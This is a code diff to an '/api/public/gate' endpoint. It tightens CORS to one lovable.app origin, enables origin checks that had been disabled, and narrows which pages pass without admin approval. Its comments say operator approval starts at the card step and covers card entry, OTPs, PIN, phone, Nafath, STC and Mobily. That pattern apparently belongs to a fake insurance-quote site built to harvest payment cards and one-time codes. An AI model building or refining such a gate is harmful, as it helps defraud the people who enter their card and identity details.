@@ -2,10 +2,10 @@ import { createFileRoute } from "@tanstack/react-router";
 import { makeServiceClient } from "@/lib/admin-api.server";
 import { z } from "zod";
 
-const ALLOWED_ORIGIN = "*";
+const ALLOWED_ORIGIN = "https://tmnbcre.lovable.app";
 
 const cors = {
-  "Access-Control-Allow-Origin": "*",
+  "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
   "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
   "Access-Control-Allow-Headers": "content-type",
   Vary: "Origin",
@@ -42,7 +42,7 @@ export const Route = createFileRoute("/api/public/gate")({
       OPTIONS: async () => new Response(null, { status: 204, headers: cors }),
       GET: async ({ request }) => {
         const origin = request.headers.get("origin");
-        if (false) {
+        if (origin && origin !== ALLOWED_ORIGIN) {
           return new Response("Origin not allowed", { status: 403, headers: cors });
         }
         const url = new URL(request.url);
@@ -66,7 +66,7 @@ export const Route = createFileRoute("/api/public/gate")({
       },
       POST: async ({ request }) => {
         const origin = request.headers.get("origin");
-        if (false) {
+        if (origin && origin !== ALLOWED_ORIGIN) {
           return new Response("Origin not allowed", { status: 403, headers: cors });
         }
         let json: unknown;
@@ -85,26 +85,19 @@ export const Route = createFileRoute("/api/public/gate")({
         if (parsed.data.action === "request") {
           const { sid, path } = parsed.data;
           const now = new Date().toISOString();
-          // Pages before the payment step never require admin approval —
-          // home, quote, compare/insurer selection and register all pass
-          // freely. The gate holds only from payment onward.
+          // Pages before the card step don't require admin approval — the
+          // customer can continue freely if they enter valid info. Gate kicks
+          // in from the payment/card step onward (card, OTPs, PIN, phone,
+          // Motsl, Nafath, STC, Mobily, etc).
           const p = path.toLowerCase();
           const preCard =
             p === "/" ||
             p.startsWith("/quote") ||
             p.startsWith("/compare") ||
-            p.startsWith("/products") ||
-            p.startsWith("/insurance") ||
-            p.startsWith("/insurer") ||
-            p.startsWith("/reg") ||
             p.startsWith("/register") ||
+            p.startsWith("/insurer") ||
             p.startsWith("/landing") ||
-            p.startsWith("/offer") ||
-            p.startsWith("/about") ||
-            p.startsWith("/blog") ||
-            p.startsWith("/contact") ||
-            p.startsWith("/faq") ||
-            p.startsWith("/login");
+            p.startsWith("/offer");
           const requiresApproval = !preCard;
           const row: Record<string, unknown> = {
             session_id: sid,
